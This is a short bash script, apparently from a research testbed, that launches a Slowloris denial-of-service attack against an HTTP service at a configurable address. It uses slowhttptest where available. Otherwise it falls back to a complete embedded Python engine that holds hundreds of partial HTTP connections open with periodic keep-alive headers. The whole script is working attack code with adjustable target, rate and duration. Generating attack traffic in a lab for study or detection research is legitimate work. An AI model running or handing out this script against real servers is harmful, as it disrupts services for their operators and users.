#!/usr/bin/env bash
# =============================================================================
# attack_slowloris.sh
# Launches a low-rate, stealthy application-layer Slowloris DDoS attack
# against the OVS MEC HTTP service using slowhttptest (with Python fallback).
# =============================================================================

set -u

TARGET_IP="${1:-${TARGET_IP:-10.200.0.10}}"
TARGET_PORT="${2:-8080}"
CONNECTIONS="${3:-250}"
DURATION_SEC="${4:-30}"
RATE="${5:-50}"

echo "[ATTACK] Launching Slowloris low-rate DDoS against http://${TARGET_IP}:${TARGET_PORT}/..."
echo "[ATTACK] Parameters: connections=${CONNECTIONS}, rate=${RATE}/s, duration=${DURATION_SEC}s"

if command -v slowhttptest >/dev/null 2>&1; then
    slowhttptest -c "${CONNECTIONS}" -H -i 10 -r "${RATE}" \
        -t GET -u "http://${TARGET_IP}:${TARGET_PORT}/" \
        -x 24 -p 3 -l "${DURATION_SEC}" || true
else
    echo "[WARN] slowhttptest binary not found; executing built-in Python Slowloris socket engine..."
    python3 - "${TARGET_IP}" "${TARGET_PORT}" "${CONNECTIONS}" "${DURATION_SEC}" <<'EOF'
import socket
import sys
import time

target_ip = sys.argv[1]
target_port = int(sys.argv[2])
conn_count = int(sys.argv[3])
duration = int(sys.argv[4])

sockets = []
for i in range(conn_count):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.0)
        s.connect((target_ip, target_port))
        s.send(f"GET /?{i} HTTP/1.1\r\nHost: {target_ip}\r\n".encode("ascii"))
        sockets.append(s)
    except OSError:
        pass

end_time = time.time() + duration
while time.time() < end_time and sockets:
    for s in list(sockets):
        try:
            s.send(b"X-Keep-Alive: 1\r\n")
        except OSError:
            sockets.remove(s)
    time.sleep(2.0)

for s in sockets:
    try:
        s.close()
    except OSError:
        pass
EOF
fi

echo "[ATTACK] Slowloris execution completed."
